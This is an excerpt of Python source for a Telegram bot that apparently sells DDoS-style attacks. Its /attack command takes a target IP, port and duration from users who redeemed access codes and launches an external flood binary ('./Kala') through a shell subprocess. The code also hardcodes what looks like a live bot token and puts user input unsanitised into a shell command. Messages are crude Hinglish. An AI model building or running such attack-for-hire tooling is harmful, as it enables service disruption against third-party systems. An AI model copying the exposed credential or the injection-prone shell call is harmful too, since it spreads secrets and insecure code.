...
TELEGRAM_BOT_TOKEN = '8160398936:AAFZvuJil0gr7u_XlK6NbA-L1ltMZBoGTUk'
...
async def help_command(update: Update, context: CallbackContext):
    ...
    if user_id != ADMIN_USER_ID:
        help_text = (
            ...
            "*🔸 /redeem* - 𝐑𝐄𝐃𝐄𝐄𝐌 𝐀 𝐂𝐎𝐃𝐄.\n"
            "*🔸 /get_id* - 𝐁𝐇𝐀𝐈 𝐊𝐎 𝐈𝐃 𝐂𝐇𝐀𝐇𝐈𝐘𝐀 𝐊𝐘𝐀? ?.\n"
        )
    else:
        help_text = (
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        ...
        return
    message = (
        f"*🔥 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐓𝐇𝐄 𝐖𝐎𝐑𝐋𝐃 𝐎𝐅 @SIDIKI_MUSTAFA_47, {user_name}! 🔥*\n\n"
...
async def attack(update: Update, context: CallbackContext):
    ...
    user_id = update.effective_user.id
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot! 𝐃𝐌-@SIDIKI_MUSTAFA_47*", parse_mode='Markdown')
        return
    args = context.args
    if len(args) != 3:
    ...
    if not ip.startswith(valid_ip_prefixes):
        await context.bot.send_message(chat_id=chat_id, text="*❌ 𝐆𝐀𝐋𝐀𝐓 𝐈𝐃 𝐌𝐀𝐓 𝐃𝐀𝐋 𝐍𝐀 𝐁𝐇𝐀𝐈! Please use an IP with a valid prefix.*", parse_mode='Markdown')
        return
    cooldown_period = 60
    ...
    if user_id in cooldown_dict:
        ...
        if time_diff < cooldown_period:
            ...
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⏳ KALIA KA KALA LUND RUK JA {remaining_time}*",
                parse_mode='Markdown'
            )
            return
    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
        await context.bot.send_message(chat_id=chat_id, text="*❌ 𝐀𝐑𝐄 𝐄𝐊 𝐇𝐈 𝐈𝐏 𝐏𝐄 𝐊𝐈𝐓𝐍𝐄 𝐁𝐀𝐀𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐊𝐀𝐑𝐄 𝐆𝐀 𝐍𝐇𝐈 𝐇𝐎𝐆𝐀 𝐁𝐇𝐀𝐈!*", parse_mode='Markdown')
        return
...
async def papa_bol(update: Update, context: CallbackContext):
    user_id = update.effective_user.id 
    message = f" ID HAI: `{user_id}`" 
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./Kala {ip} {port} {duration}",
...
async def generate_redeem_code(update: Update, context: CallbackContext):
    ...
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ 𝑩𝑶𝑻 𝑲𝑬 𝑷𝑰𝑻𝑨 𝑺𝑯𝑹𝑬𝑬 𝑯𝑰 𝑹𝑼𝑵 𝑲𝑹 𝑺𝑨𝑲𝑻𝑬 𝑯𝑬 𝒀𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 @SIDIKI_MUSTAFA_47!*", 
            parse_mode='Markdown'
        )
        return
    if len(context.args) < 1:
